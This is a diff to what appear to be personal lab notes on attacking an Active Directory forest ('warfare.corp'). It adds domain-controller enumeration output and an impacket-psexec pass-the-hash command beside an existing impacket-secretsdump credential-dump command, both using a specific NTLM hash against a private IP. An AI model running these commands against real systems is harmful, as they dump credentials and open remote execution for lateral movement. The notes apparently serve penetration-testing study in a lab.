@@ -227,6 +227,20 @@ SMB LSA
 	InfrastructureRoleOwner : dc01.warfare.corp
 	Name                    : warfare.corp
 
+	 
+	** (Get-NetForestDomain).DomainControllers
+	Forest                     : warfare.corp
+	Roles                      : {PdcRole, RidRole, InfrastructureRole}
+	Domain                     : child.warfare.corp
+	IPAddress                  : ::1
+	Name                       : cdc.child.warfare.corp
+	
+	Forest                     : warfare.corp
+	Domain                     : warfare.corp
+	OutboundConnections        : {21eb66cd-7c3d-47bd-b1e6-b0413d1aa420}
+	Name                       : dc01.warfare.corp
+	
+
 
  	** net user /dom
   	** net group /dom
@@ -239,5 +253,7 @@ SMB LSA
 
 # Impacket
 	impacket-secretsdump child/corpmngr@192.168.98.120 -hashes :4cb3933610b827a281ec479031128cc6 -> using this when you know corpmnrg has a path of administrator local (check with "net localgroup Administrators")
+
+ 	impacket-psexec child/corpmngr@192.168.98.120 -hashes :4cb3933610b827a281ec479031128cc6
 
 
